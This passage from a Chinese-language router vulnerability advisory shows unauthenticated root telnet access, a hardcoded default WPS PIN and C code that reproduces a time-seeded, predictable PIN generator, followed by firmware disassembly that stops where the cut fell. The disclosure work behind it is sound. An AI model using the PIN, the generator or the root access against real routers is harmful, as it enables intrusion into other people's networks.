    ^C
    user@kali:~$ telnet 192.168.1.1
    Trying 192.168.1.1...
    Connected to 192.168.1.1.
    Escape character is '^]'.
    OpenEmbedded Linux homerouter.cpe
    msm 20141210 homerouter.cpe
    / # id
    uid=0(root) gid=0(root)
    / # exit
    Connection closed by foreign host.
    user@kali:~$
**漏洞细节分析－默认WPS PIN码**
路由器中的WPS是由Wi-Fi联盟所推出的全新Wi-Fi安全防护设定(Wi-Fi Protected
Setup)标准，该标准推出的主要原因是为了解决长久以来无线网络加密认证设定的步骤过于繁杂艰难之弊病，使用者往往会因为步骤太过麻烦，以致干脆不做任何加密安全设定，因而引发许多安全上的问题。我们可以在路由器中的help.html中查看到相关的信息。
默认配置下，该路由器WPS系统的PIN码永远都是“28296607”。实际上，这个PIN码是硬编码在“/bin/appmgr”程序中的。
除此之外，我们不仅还可以在HostAP配置中找到这个PIN码，而且由于设备存在信息泄漏的问题，所以我们也可以在路由器的HTTP API接口中找到该PIN码：
    root@homerouter:~# ps -a|grep hostap
     1006 root       0:00 hostapd /var/wifi/ar6k0.conf
     1219 root       0:00 grep hostap
    root@homerouter:~# cat /var/wifi/ar6k0.conf
    [...]
    ap_pin=28296607
    [...]
**漏洞细节分析－弱WPS PIN码生成**
用户可以在路由器的Web管理界面中为WPS系统生成一个临时的PIN码，但是一般用户都不会这样做，因为路由器默认已经帮用户生成了一个WPS
PIN码（28296607）。
路由器所生成的PIN码强度非常弱，因为它使用的是一个非常“奇怪”的逆向工程算法。相关代码如下所示［[点我获取quanta-wps-gen.c](https://pierrekim.github.io/advisories/quanta-wps-gen.c)］：
    user@kali:~$ cat quanta-wps-gen.c
    #include 
    #include 
    #include 
    int main(int    argc,
             char   **argv,
             char   **envp)
    {
      unsigned int  i0, i1;
      int           i2;
      /* the seed is the current time of the router, which uses NTP... */
      srand(time(0));
      i0 = rand() % 10000000;
      if (i0 <= 999999)
        i0 += 1000000;
      i1 = 10 * i0;
      i2 = (10 - (i1 / 10000 % 10 + i1 / 1000000 % 10 + i1 / 100 % 10 + 3 *
           (i1 / 100000 % 10 + 10 * i0 / 10000000 % 10 + i1 / 1000 % 10 + i1 / 10 % 10))
            % 10) % 10 + 10 * i0;
      printf("%dn", i2 );
      return (0);
    }
    user@kali:~$ gcc -o dlink-wps-gen quanta-wps-gen.c
    user@kali:~$ ./dlink-wps-gen
    97329329
    user@kali:~$
我们可以从上面的代码中看到，其使用了srand(time(0))来作为种子，这是一种非常不安全的做法。因为time(0)会以整形数值的形式返回当前的时间，而攻击者同样可以获取到当前时间。这样一来，攻击者就可以随意生成一个有效的WPS
PIN码了。由于路由器使用了网络时间协议（NTP），所以设备的时间戳设置应该没什么问题。这也就意味着，攻击者将可以轻松地生成大量有效的WPS PIN码。
为了满足各位同学们的好奇心，我们在下方给出了固件中的初始算法：
    .text:0001B4D4                 EXPORT generate_wlan_wps_enrollee_pin
    .text:0001B4D4 generate_wlan_wps_enrollee_pin          ; CODE XREF: wifi_msg_handle+194p
    .text:0001B4D4
    .text:0001B4D4 var_3C          = -0x3C
    .text:0001B4D4 var_38          = -0x38
    .text:0001B4D4 s               = -0x34
    .text:0001B4D4 var_30          = -0x30
    .text:0001B4D4 var_2C          = -0x2C
    .text:0001B4D4
    .text:0001B4D4                 STMFD           SP!, {R4-R11,LR}
    .text:0001B4D8                 SUB             SP, SP, #0x1C
    .text:0001B4DC                 STR             R0, [SP,#0x40+s]
    .text:0001B4E0                 MOV             R0, #0  ; timer
    .text:0001B4E4                 BL              time
    .text:0001B4E8                 BL              srand
    .text:0001B4EC                 BL              rand
    .text:0001B4F0                 LDR             R4, =0x6B5FCA6B
    .text:0001B4F4                 MOV             R6, R0,ASR#31
    .text:0001B4F8                 SMULL           R1, R4, R0, R4
    .text:0001B4FC                 RSB             R10, R6, R4,ASR#22
    .text:0001B500                 RSB             R12, R10, R10,LSL#5
    .text:0001B504                 RSB             R2, R12, R12,LSL#6
    .text:0001B508                 ADD             R11, R10, R2,LSL#3
    .text:0001B50C                 LDR             R8, =0xF423F
    .text:0001B510                 ADD             R9, R11, R11,LSL#2
    .text:0001B514                 SUB             R1, R0, R9,LSL#7
    .text:0001B518                 CMP             R1, R8
    .text:0001B51C                 ADDLS           R1, R1, #0xF4000
    .text:0001B520                 ADDLS           R1, R1, #0x240
    .text:0001B524                 ADD             R3, R1, R1,LSL#2
    .text:0001B528                 MOV             R3, R3,LSL#1
    .text:0001B52C                 LDR             R1, =0xCCCCCCCD
    .text:0001B530                 LDR             R5, =0xA7C5AC5
    .text:0001B534                 LDR             R6, =0x6B5FCA6B
    .text:0001B538                 MOV             R7, R3,LSR#5
    .text:0001B53C                 UMULL           R4, R7, R5, R7
    .text:0001B540                 UMULL           R9, LR, R1, R3
    .text:0001B544                 UMULL           R5, R6, R3, R6
    .text:0001B548                 LDR             R12, =0xD1B71759
    .text:0001B54C                 MOV             R6, R6,LSR#22
    .text:0001B550                 UMULL           R10, R12, R3, R12
    .text:0001B554                 MOV             LR, LR,LSR#3
    .text:0001B558                 UMULL           R10, R9, R1, R6
    .text:0001B55C                 UMULL           R8, R10, R1, LR
    .text:0001B560                 LDR             R0, =0x431BDE83
    .text:0001B564                 MOV             R12, R12,LSR#13
    .text:0001B568                 UMULL           R11, R0, R3, R0
    .text:0001B56C                 STR             R10, [SP,#0x40+var_38]
    .text:0001B570                 UMULL           R8, R10, R1, R12
    .text:0001B574                 LDR             R2, =0x51EB851F
    .text:0001B578                 LDR             R4, =0x10624DD3
    .text:0001B57C                 UMULL           R5, R2, R3, R2
    .text:0001B580                 MOV             R0, R0,LSR#18
    .text:0001B584                 STR             R10, [SP,#0x40+var_3C]
    .text:0001B588                 UMULL           R8, R4, R3, R4
    .text:0001B58C                 UMULL           R8, R10, R1, R0
    .text:0001B590                 MOV             R2, R2,LSR#5
    .text:0001B594                 MOV             R7, R7,LSR#7
    .text:0001B598                 UMULL           R8, R11, R1, R7
    .text:0001B59C                 STR             R10, [SP,#0x40+var_30]
    .text:0001B5A0                 MOV             R4, R4,LSR#6
    .text:0001B5A4                 UMULL           R8, R10, R1, R2
    .text:0001B5A8                 UMULL           R8, R5, R1, R4
    .text:0001B5AC                 STR             R10, [SP,#0x40+var_2C]
    .text:0001B5B0                 MOV             R8, R9,LSR#3
    .text:0001B5B4                 MOV             R10, R11,LSR#3
    .text:0001B5B8                 ADD             R11, R10, R10,LSL#2
    .text:0001B5BC                 ADD             R9, R8, R8,LSL#2